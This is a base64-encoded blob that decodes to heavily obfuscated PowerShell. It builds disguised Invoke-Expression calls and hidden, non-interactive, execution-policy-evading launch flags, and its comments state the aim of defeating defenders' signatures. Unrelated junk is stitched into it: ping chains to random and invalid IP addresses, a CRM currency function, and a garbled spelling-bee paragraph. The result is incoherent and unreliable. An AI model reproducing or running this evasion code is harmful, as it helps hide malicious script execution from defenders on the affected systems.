Qgb2JmdXNjYXRlZCB3YXlzIHRvIGZvcm0gdGhlIHN0cmluZyAnaWV4JyBhbmQgdGhlbiBpbnZva2UgaXQgd2l0aCAuIG9yICYuCiAgICAjIFRob3VnaCBmYXIgZnJvbSBmdWxseSBidWlsdCBvdXQsIHRoZXNlIGFyZSBpbmNsdWRlZCB0byBoaWdobGlnaHQgaG93IElFWC9JbnZva2UtRXhwcmVzc2lvbiBpcyBhIGdyZWF0IGluZGljYXRvciBidXQgbm90IGEgc2lsdmVyIGJ1bGxldC4KICAgICMgVGhlc2UgbWV0aG9kcyBkcmF3IG9uIGNvbW1vbiBlbnZpcm9ubWVudCB2YXJpYWJsZSB2YWx1ZXMgYW5kIFBvd2VyU2hlbGwgQXV0b21hdGljIFZhcmlhYmxlIHZhbHVlcy9tZXRob2RzL21lbWJlcnMvcHJvcGVydGllcy9ldGMuCiAgICAkSW52b2NhdGlvbk9wZXJhdG9yID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVqSUJYbTFEbnlFM01lRkM1UzBpRXAxVW8yRignLicpKSwodDNJOXQ1ZWpJYnhtMUROeUUzbWVmYzVzMElFcDFVTzJmKCcmJykpKSkgKyAoVDNJOXQ1RUpJQlhtMWRuWUUzbUVGQzVTMGlFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KCgzIC0gMSkgKiA0KX17N317KChbaW50XSg2IC8gMikpICogKDQgLSAyKSl9ezl9eygxIC0gKDIgLSAxKSl9ezF9eyg1IC0gKDQgLSAyKSl9eygoW2ludF0oMjQgLyAzKSkgLSAoMyArIDApKX17Mn17KCg0IC0gMikgKiAyKX17KDIgKiAoLTQgKyA5KSl9Jy1mJzFdKycsJ2AkU21KbDFNSDFNTGtsJywnWygxICogKDI3IC0gMTQpKScsJ2hlbCcsJ10rJycsJ2xJZCcsJ2VsbCcsJyRTaCcsJyggYCcsJ0lkWycsJ3gnKScpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KDkgLSA0KX17KDIgKyAoLTEgKyAyKSl9eygxIC0gKDMgLSAyKSl9eygoNCAtIDIpICogKDMgLSAxKSl9ezJ9eygtKDMgLSAyKSArICgzIC0gMSkpfSctZidQUycsJ1snLCdtZScsJ2AkZGlhc05pcnpTajdCJywnSG8nLCcoICcpICsgKEdldC1SYW5kb20gLUlucHV0IEAoNCwyMSkpICsgKHQzSTl0NWVKSUJ4bTFEbllFM01lRkM1UzBpRXAxdW8yRignXStgJFBzaG9NZVsnKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgzMCwzNCkpICsgKHQzSTlUNWVqSWJ4bTFETlllM21lZkM1czBpRXAxdU8yZignXSsneCcpJykpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KDIgKiAyKX17KDEgKiA1KX17Mn17MX17MH17M30nLWYncGVjJywnb21TJywndjpDJywnWygyICogMiksJywnKCBgJywnJGwwUVdoSjExRWYxVEhwJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgxNSwyNCwyNikpICsgKFQzSTl0NWVqaUJYTTFEbnlFM01FZmM1czBJRVAxVU8yZignLCgtKDAgKyAxKSArIDI2KV0tSm9pbicnKScpKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgnezB9Jy1mJygoJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOVQ1RWppQlhNMWROWWUzbUVGQzVTMGlFUDFVbzJmKCdHZXQtVmFyaWFibGUnKSksKHQzaTl0NUVqSUJYbTFkbllFM01FZkM1czBpRXAxdU8yRignR1YnKSksKHQzSTlUNWVKaUJ4bTFEbllFM01FZmM1czBJZXAxVW8yRignVmFyaWFibGUnKSkpKSArIChUM2k5dDVlaklCeG0xRG5ZRTNtZUZjNXMwSWVQMVVPMmYoJyAnKm1kcionKS5OYW1lWyhbaW50XSgoLTQgKyAxMykgLyAoMCArIDMpKSksKDEgKiAoMTggLSA3KSksMl0tSm9pbicnKScpKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgneygoMSAtIDEpICsgMCl9ezF9Jy1mJygnLCcgJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOVQ1ZWpJYnhtMUROWUUzbWVmQzVzMGlFUDF1bzJGKCckb3pSbGVzVUJrSzdrc2VQQjR3eGUuVG9TdHJpbmcoKScpKSwodDNJOXQ1ZWpJQnhtMUROWUUzbUVmYzVzMElFcDFVbzJGKCcoW1N0cmluZ10kb3pSbGVTdUJrSzdrU2VwYjRXeGUpJykpKSkgKyAoJ3soMSAtIDEpfXsxfXsyfSctZidbKDMgLSAyKSwoLSgxICsgMSkgKyAoW2ludF0oMTAgLyAyKSkpXSsnLCcneCctSm8nLCdpbicnKScpCiAgICAjIENvbW1lbnRpbmcgYmVsb3cgb3B0aW9uIHNpbmNlICRlbnY6UHVibGljIGRpZmZlcnMgaW4gc3RyaW5nIHZhbHVlIGZvciBub24tRW5nbGlzaCBvcGVyYXRpbmcgc3lzdGVtcy4KICAgICMkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgIiggYCRlbnY6UHVibGljWzEzXStgJGVudjpQdWJsaWNbNV0rJ3gnKSIKCiAgICAjIFJhbmRvbWx5IGNob29zZSBmcm9tIGFib3ZlIGludm9rZSBvcGVyYXRpb24gc3ludGF4ZXMuCiAgICAkSW52b2tlRXhwcmVzc2lvbiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkSW52b2tlRXhwcmVzc2lvblN5bnRheCkKCiAgICAjIFJhbmRvbWl6ZSB0aGUgY2FzZSBvZiBzZWxlY3RlZCBpbnZva2Ugb3BlcmF0aW9uLgogICAgJEludm9rZUV4cHJlc3Npb24gPSAoW0NoYXJbXV0kSW52b2tlRXhwcmVzc2lvbiB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgIAogICAgIyBDaG9vc2UgcmFuZG9tIEludm9rZS1FeHByZXNzaW9uL0lFWCBzeW50YXggYW5kIG9yZGVyaW5nOiBJRVggKCRTY3JpcHRTdHJpbmcpIG9yICgkU2NyaXB0U3RyaW5nIHwgSUVYKQogICAgJEludm9rZU9wdGlvbnMgID0gQCgpCiAgICAkSW52b2tlT3B0aW9ucyArPSAoVDNJOVQ1ZUppQnhtMUROeUUzbUVmYzVTMGllcDF1TzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEludm9rZUV4cHJlc3Npb24gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1ZWpJQnhNMWRuWUUzTWVGYzVzMGlFcDF1TzJmKCcoJykpICsgKFQzaTl0NWVqSWJ4TTFEblllM01FZmM1UzBpRVAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICROZXdTY3JpcHQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOXQ1ZWpJYlhtMWRuWWUzbWVGYzVzMGlFUDFVTzJGKCcpJykpICsgKFQzSTlUNWVKaWJ4bTFEbnllM21lZmM1czBpRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKQogICAgJEludm9rZU9wdGlvbnMgKz0gKFQzSTl0NWVKSUJ4TTFkbnllM21lZmM1UzBJZVAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICROZXdTY3JpcHQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZWppQlhtMWROWUUzTUVGYzVTMElFUDFVTzJmKCd8JykpICsgKHQzSTl0NWVKaUJ4bTFEbnlFM21FZmM1UzBJRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRJbnZva2VFeHByZXNzaW9uCgogICAgJE5ld1NjcmlwdCA9IChHZXQtUmFuZG9tIC1JbnB1dCAkSW52b2tlT3B0aW9ucykKCiAgICAjIElmIHVzZXIgZGlkIG5vdCBpbmNsdWRlIC1QYXNzVGhydSBmbGFnIHRoZW4gY29udGludWUgd2l0aCBhZGRpbmcgZXhlY3V0aW9uIGZsZ3MgYW5kIHBvd2Vyc2hlbGwuZXhlIHRvICROZXdTY3JpcHQuCiAgICBJZighJFBTQm91bmRQYXJhbWV0ZXJzWygneygyICsgMCl9eygxICsgMil9ezB9eygxICsgMCl9Jy1mJ1RoJywncnUnLCdQYScsJ3NzJyldKQogICAgewogICAgICAgICMgQXJyYXkgdG8gc3RvcmUgYWxsIHNlbGVjdGVkIFBvd2VyU2hlbGwgZXhlY3V0aW9uIGZsYWdzLgogICAgICAgICRQb3dlclNoZWxsRmxhZ3MgPSBAKCkKCiAgICAgICAgIyBCdWlsZCB0aGUgUG93ZXJTaGVsbCBleGVjdXRpb24gZmxhZ3MgYnkgcmFuZG9tbHkgc2VsZWN0aW5nIGV4ZWN1dGlvbiBmbGFncyBzdWJzdHJpbmdzIGFuZCByYW5kb21pemluZyB0aGUgb3JkZXIuCiAgICAgICAgIyBUaGlzIGlzIHRvIHByZXZlbnQgQmx1ZSBUZWFtIGZyb20gcGxhY2luZyBmYWxzZSBob3BlIGluIHNpbXBsZSBzaWduYXR1cmVzIGZvciBjb21tb24gc3Vic3RyaW5ncyBvZiB0aGVzZSBleGVjdXRpb24gZmxhZ3MuCiAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyA9IE5ldy1PYmplY3QgU3RyaW5nW10oMCkKICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KDAgKyAoMSAtIDEpKX17KDMgLSAyKX0nLWYnTm9FeCcsJ2l0JyldKQogICAgICAgICJAQCIKICAgICAgICB7CiAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzaTlUNUVqSUJ4bTFEbnlFM21FZmM1UzBpZXAxdW8yRignLU5vRXhpdCcpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3sxfXsoMSAtIDEpfSctZidmaWxlJywnTm9Qcm8nKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM2k5dDVFSklCeE0xRG5ZRTNtRWZDNXMwSUVwMVVPMmYoJy1Ob1Byb2ZpbGUnKSk7CiAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gNCAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7MH17Mn17KDEgKyAwKX0nLWYnTm9uSW4nLCd0aXZlJywndGVyYWMnKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM0k5dDVlSmlieE0xZG55RTNtRWZjNXMwSUVQMXVPMkYoJy1Ob25JbnRlcmFjdGl2ZScpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA1IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3soLTEgKyAyKX17KDAgKyAwKX0nLWYnZ28nLCdOb0xvJyldKQogICAgICAgIHsKICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNJOXQ1ZWpJQnhNMUROWWUzTUVmYzVzMElFcDF1bzJmKCctTm9Mb2dvJykpOwogICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDQgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkKICAgICAgICB9CiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygneyg3IC0gNCl9eygyIC0gMSl9eygoW2ludF0oOCAvIDIpKSArIDEpfXsoLTEgKyA1KX17MH17Mn0nLWYneWwnLCduZCcsJ2UnLCdXaScsJ1N0Jywnb3cnKV0gLU9SICRXaW5kb3dzU3R5bGUpCiAgICAgICAgewogICAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzSTl0NWVqaUJYbTFEbnllM21lZmM1czBpZXAxVU8yRignLVdpbmRvd1N0eWxlJykpCiAgICAgICAgICAgIElmKCRXaW5kb3dzU3R5bGUpIHskQXJndW1lbnRWYWx1ZSA9ICRXaW5kb3dzU3R5bGV9CiAgICAgICAgICAgIEVsc2UgeyRBcmd1bWVudFZhbHVlID0gJFBTQm91bmRQYXJhbWV0ZXJzWygnezF9eygoMSArIDApIC0gKDMgLSAyKSl9Jy1mJ1N0eWxlJywnV2luZG93JyldfQoKICAgICAgICAgICAgIyBSYW5kb21seSBkZWNpZGUgdG8gd3JpdGUgV2luZG93U3R5bGUgdmFsdWUgd2l0aCBmbGFnIHN1YnN0cmluZyBvciBpbnRlZ2VyIHZhbHVlLgogICAgICAgICAgICBTd2l0Y2goJEFyZ3VtZW50VmFsdWUuVG9Mb3dlcigpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAoJ3soKDEgKiA1KSAtIDMpfXsoW2ludF0oMTUgLyAzKSl9eygtKDIgKyAyKSArICgtMyArIDExKSl9ezF9eygtKC0yICsgNCkgKyAoMTAgLSA1KSl9eygxIC0gMSl9Jy1mJ2wnLCdtJywnbicsJ2EnLCdyJywnbycpICAgIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOXQ1ZUppQnhtMUROeUUzbWVmYzVzMGllcDFVTzJmKCcoMCArIDApJykpLChUM0k5dDVlamlCeE0xRE55ZTNNRUZjNXMwSWVQMVVPMmYoJ24nKSksKFQzSTl0NWVKaWJYbTFkTnlFM01FZmM1czBpRXAxdU8yZignbm8nKSksKHQzSTlUNWVqSWJYTTFkbnlFM01FZkM1czBJRVAxVU8yZignbm9yJykpLChUM0k5dDVFSklieE0xRG55ZTNtZWZjNXMwSWVQMVVPMmYoJ25vcm0nKSksKHQzSTlUNUVqaWJ4bTFETnllM21FZmM1UzBpRXAxdW8yRignbm9ybWEnKSkpKX19CiAgICAgICAgICAgICAgICAoJ3soMCArIDApfXsoMiAtIDEpfSctZidoaWQnLCdkZW4nKSAgICB7SWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRBcmd1bWVudFZhbHVlID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzaTl0NUVqaUJYTTFEblllM21FRmM1czBpZVAxdW8yRignKCgtMSArIDQpIC0gMiknKSksKFQzSTl0NUVqaUJ4TTFETnlFM01FRmM1UzBpRXAxdW8yZignaCcpKSwodDNJOXQ1ZWpJQnhtMWRueUUzTUVGYzVTMGllcDF1TzJGKCdoaScpKSwoVDNJOXQ1ZUpJQlhNMWRueWUzbUVmYzVzMElFcDFVTzJmKCdoaWQnKSksKFQzSTlUNWVKSUJ4bTFEbnlFM21FZmM1czBJRXAxVW8yRignaGlkZCcpKSwoVDNJOXQ1ZWpJQlhtMWRueWUzTWVmYzVTMEllcDF1TzJGKCdoaWRkZScpKSkpfX0KICAgICAgICAgICAgICAgICgneygtKDMgKyAxKSArICgtMSArIDkpKX17KC0oLTUgKyAxMykgKyAoLTEyICsgMjgpKX17KDEgKyAoLTEgKyAyKSl9ezh9eygtKDIgKiAyKSArICgxNyAtIDkpKX17KFtpbnRdKDMyIC8gNCkpfXsoKDIgKyAwKSAqIDMpfXsoMTMgLSA2KX17MX0nLWYnaScsJ2QnLCduJywnbScsJ20nLCdpJywneicsJ2UnLCdpJykge0lmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQXJndW1lbnRWYWx1ZSA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM0k5dDVlamlCeG0xRG5ZRTNtRUZDNXMwaUVQMXVPMmYoJzInKSksKFQzSTlUNUVqaWJ4bTFEbnlFM21lRkM1UzBpRVAxVU8yZignbWknKSksKFQzSTl0NWVKSUJYTTFETllFM01FRmM1czBJRXAxdW8yZignbWluJykpLCh0M0k5dDVFaklCeG0xRG5ZRTNtRWZDNXMwaUVQMVVPMmYoJ21pbmknKSksKHQzSTl0NUVqaUJ4bTFEbnllM21FRmM1UzBpRXAxVU8yRignbWluaW0nKSksKFQzaTl0NWVqSUJYTTFEbnlFM21FZkM1czBJZVAxdU8yZignbWluaW1pJykpLChUM0k5VDVlaklCeG0xRG55ZTNtRWZjNVMwSUVwMVVPMmYoJ21pbmltaXonKSksKFQzSTl0NWVqaUJ4bTFEbllFM01FRmM1czBpRVAxdU8yRignbWluaW1pemUnKSkpKX19CiAgICAgICAgICAgICAgICAoJ3sxfXsoMSAtIDEpfSctZidpemVkJywnbWF4aW0nKSB7SWYoR2V0LVJhbmRvbSAtSW5wdXQgQCgwLi4xKSkgeyRBcmd1bWVudFZhbHVlID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTlUNWVKSWJ4TTFEbnllM21FZmM1UzBpZVAxVU8yRignKFtpbnRdKDYgLyAyKSknKSksKFQzSTlUNWVKaUJ4bTFkTnllM01lRkM1UzBpZXAxVU8yRignbWEnKSksKHQzSTl0NUVqSUJ4bTFkTnlFM01FZmM1UzBpRXAxVW8yRignbWF4JykpLChUM0k5dDVlSklCeG0xRG5ZRTNtZWZDNVMwSUVwMVVPMkYoJ21heGknKSksKFQzSTl0NUVqSWJ4TTFEblllM21lRmM1czBpZXAxdU8yZignbWF4aW0nKSksKHQzSTl0NUVKaUJ4bTFETlllM21lRmM1czBJRXAxdU8yZignbWF4aW1pJykpLCh0M2k5dDVlakliWE0xRG5ZRTNtZWZjNXMwaWVQMVVPMmYoJ21heGltaXonKSksKHQzSTl0NWVqSWJ4bTFkbllFM21FZkM1UzBJRXAxVU8yZignbWF4aW1pemUnKSkpKX19CiAgICAgICAgICAgICAgICBkZWZhdWx0IHtXcml0ZS1FcnJvciAoJ3soKDMgLSAyKSArIDMpfXsxMn17KDEgKiAxMyl9ezJ9eygtMSArIDIpfXsoKFtpbnRdKDYgLyAyKSkgKiAzKX17KCgzIC0gMSkgKiAoMiAqIDIpKX17KC04ICsgKDExICsgNykpfXsoKDE3IC0gNCkgLSAoLTIgKyA0KSl9eygtMSArIDQpfXsoMyAqIDIpfXswfXsoMiArIDMpfXsoMSAqIDcpfXsoW2ludF0oNzAgLyAoNSArIDApKSl9Jy1mJ2ZvciBPdXQnLCdhbHVlICgkZGlBc25pclpzajdiJywnVmFsdWUgdicsJyBzd2l0Y2gnLCdBbiBpbnZhJywnLVBvd2VyUycsJyBibG9jayAnLCdoZWxsTGF1JywndFZhbHVlKScsJ0FyZ3VtZW4nLCcgd2FzIHBhJywnc3NlZCB0bycsJ2xpZCBgJFlic01MQjBuNHlwaEtyRU05Q2NGJywncmd1bWVudCcsJ25jaGVyLicpOyBFeGl0O30KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFBvd2VyU2hlbGxGbGFncyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDIgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkgKyAnICcqKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAzKSArICRBcmd1bWVudFZhbHVlCiAgICAgICAgfQogICAgICAgIElmKCRQCiJACiAgICBQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTsKCiRlVmV6UldmYXU1NnFNRVpCdjI2cEIgPSBAIiAKICAgICAgICAgICAgRm9yKCRJbmRleD0zOyAkSW5kZXggLWxlICRGdWxsQXJndW1lbnQuTGVuZ3RoOyAkSW5kZXgrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEV4ZWN1dGlvblBvbGljeUZsYWdzICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsJEluZGV4KQogICAgICAgICAgICB9CiAgICAgICAgICAgICRFeGVjdXRpb25Qb2xpY3lGbGFnID0gR2V0LVJhbmRvbSAtSW5wdXQgJEV4ZWN1dGlvblBvbGljeUZsYWdzCiAgICAgICAgICAgICRQb3dlclNoZWxsRmxhZ3MgKz0gJEV4ZWN1dGlvblBvbGljeUZsYWcgKyAnICcqKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAzKSArICRBcmd1bWVudFZhbHVlCiAgICAgICAgfQogICAgICAgIAogICAgICAgICMgUmFuZG9taXplIHRoZSBvcmRlciBvZiB0aGUgZXhlY3V0aW9uIGZsYWdzLgogICAgICAgICMgVGhpcyBpcyB0byBwcmV2ZW50IHRoZSBCbHVlIFRlYW0gZnJvbSBwbGFjaW5nIGZhbHNlIGhvcGUgaW4gc2ltcGxlIHNpZ25hdHVyZXMgZm9yIG9yZGVyaW5nIG9mIHRoZXNlIGZsYWdzLgogICAgICAgICJAQCIKICAgICAgICBJZigkQ29tbWFuZGxpbmVPcHRpb25zLkNvdW50IC1ndCAxKQogICAgICAgIHsKICAgICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyA9IEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICRDb21tYW5kbGluZU9wdGlvbnMgLUNvdW50ICRDb21tYW5kbGluZU9wdGlvbnMuQ291bnQKICAgICAgICB9CgogICAgICAgICMgSWYgc2VsZWN0ZWQgdGhlbiB0aGUgLUNvbW1hbmQgZmxhZyBuZWVkcyB0byBiZSBhZGRlZCBsYXN0LgogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3szfXsoKDQgKyAxKSAtIDEpfXsoOCAtIDMpfXsoMTAgLSA1KX17KDcgLSAoMSArIDApKX17KCgzIC0gMikgLSAxKX17KDIgLSAxKX0nLWYnbicsJ2QnLCdtJywnQycsJ28nLCdtJywnYScpXSkKICAgICAgICB7CiAgICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAodDNJOXQ1ZWppQnhtMWROeWUzbUVmYzVzMGllcDF1bzJmKCctQ29tbWFuZCcpKQogICAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gMiAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KCiAgICAgICAgIyBSYW5kb21pemUgdGhlIGNhc2Ugb2YgYWxsIGNvbW1hbmQtbGluZSBhcmd1bWVudHMuCiAgICAgICAgRm9yKCRpPTA7ICRpIC1sdCAkUG93ZXJTaGVsbEZsYWdzLkNvdW50OyAkaSsrKQogICAgICAgIHsKICAgICAgICAgICAgJFBvd2VyU2hlbGxGbGFnc1skaV0gPSAoW0NoYXJbXV0kUG93ZXJTaGVsbEZsYWdzWyRpXSB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgICAgICB9CgogICAgICAgICMgUmFuZG9tLXNpemVkIHdoaXRlc3BhY2UgYmV0d2VlbiBhbGwgZXhlY3V0aW9uIGZsYWdzIGFuZCBlbmNhcHN1bGF0aW5nIGZpbmFsIHN0cmluZyBvZiBleGVjdXRpb24gZmxhZ3MuCiAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyA9ICgkQ29tbWFuZGxpbmVPcHRpb25zIHwgRm9yRWFjaC1PYmplY3QgeyRfICsgJyAnKihHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMyl9KSAtSm9pbiAodDNpOXQ1ZWpJQlhtMUROeUUzbUVmYzVzMGllUDFVTzJmKCcnKSkKICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zID0gKHQzaTlUNUVqaWJ4TTFkbnllM21FZkM1czBJRVAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtTWluaW11bSAwIC1NYXhpbXVtIDMpICsgJENvbW1hbmRsaW5lT3B0aW9ucyArICcgJyooR2V0LVJhbmRvbSAtTWluaW11bSAwIC1NYXhpbXVtIDMpCgoiQCAgICAgICAgICAKICAgIFBpbmcgNjkuMjM1LjQyMC4xMiAtbiAxCgojIyMgQ1JNIFR5cGVzICMjIwpmdW5jdGlvbiA5ewoKIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSggICAgICAgIAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0wKV0KICAgICAgICBbZG91YmxlXSRWYWx1ZQogICAgKQogICAgJGNybU1vbmV5ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgTWljcm9zb2Z0LlhybS5TZGsuTW9uZXkKICAgICRjcm1Nb25leS5WYWx1ZSA9ICRWYWx1ZQogICAgJGNybU1vbmV5CiAgICByZXR1cm4KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgp